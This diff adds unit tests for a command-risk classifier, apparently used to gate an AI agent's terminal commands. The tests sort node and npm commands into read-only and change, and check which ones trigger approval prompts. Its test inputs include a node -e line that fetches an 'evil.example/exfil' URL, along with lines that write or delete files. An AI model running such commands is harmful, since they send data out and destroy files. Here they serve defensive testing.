@@ -12,6 +12,47 @@ test("read-only server checks are read", () => {
   ]) assert.equal(classifyCommand(c), "read", c);
 });
 
+test("node and npm commands are assessed by arguments and side effects, not blanket-trusted as read", () => {
+  // Genuine read-only flags/subcommands
+  for (const c of [
+    "node -v",
+    "node --version",
+    "node --check src/index.js",
+    "node -c app.js",
+    "npm -v",
+    "npm --version",
+    "npm list",
+    "npm ls --depth=0",
+    "npm outdated",
+    "npm view express version",
+    "npm audit",
+    "npm config get registry",
+  ]) {
+    assert.equal(classifyCommand(c), "read", `expected read: ${c}`);
+  }
+
+  // Arbitrary scripts, tests, installs, audit fix, and side-effecting node -e must be classified as change
+  for (const c of [
+    "node script.js",
+    "node --test",
+    "node --test test/unit.test.js",
+    "node -e \"require('fs').writeFileSync('pwned.txt', '1')\"",
+    "node -e \"import('fs').then(fs => fs.unlinkSync('a'))\"",
+    "node -e \"console.log(1); process.exit(1)\"",
+    "node -e \"fetch('https://evil.example/exfil')\"",
+    "npm test",
+    "npm run build",
+    "npm run test",
+    "npm install",
+    "npm ci",
+    "npm audit fix",
+    "npm audit fix --force",
+    "npm publish",
+  ]) {
+    assert.equal(classifyCommand(c), "change", `expected change: ${c}`);
+  }
+});
+
 test("recoverable changes are change", () => {
   for (const c of [
     "systemctl restart nginx", "docker restart api", "apt install -y htop", "npm install", "sed -i 's/80/8080/' /etc/nginx/nginx.conf",
@@ -39,4 +80,11 @@ test("approval: dangerous always asks; reads run (except Ask mode); changes foll
   assert.equal(ssh("systemctl restart nginx", "ask", "auto_workspace", true).ask, false, "allowed for this mission");
   assert.deepEqual(ssh("reboot", "allowed", "full_access", true), { ask: true, dangerous: true, risk: "dangerous" });
   assert.deepEqual(approvalFor({ toolName: "write_file", args: {}, permission: "ask", accessMode: "full_access", approvedForRun: false }), { ask: true, dangerous: false });
+
+  // Terminal command risk in auto_workspace vs full_access:
+  const term = (command: string, permission: "allowed" | "ask", accessMode?: string) =>
+    approvalFor({ toolName: "terminal", args: { command }, permission, accessMode, approvedForRun: false });
+  assert.equal(term("node -v", "ask", "auto_workspace").ask, false, "read-only node -v is allowed in auto_workspace");
+  assert.equal(term("node script.js", "ask", "auto_workspace").ask, true, "node script.js requires approval in auto_workspace");
+  assert.equal(term("npm audit fix", "ask", "auto_workspace").ask, true, "npm audit fix requires approval in auto_workspace");
 });
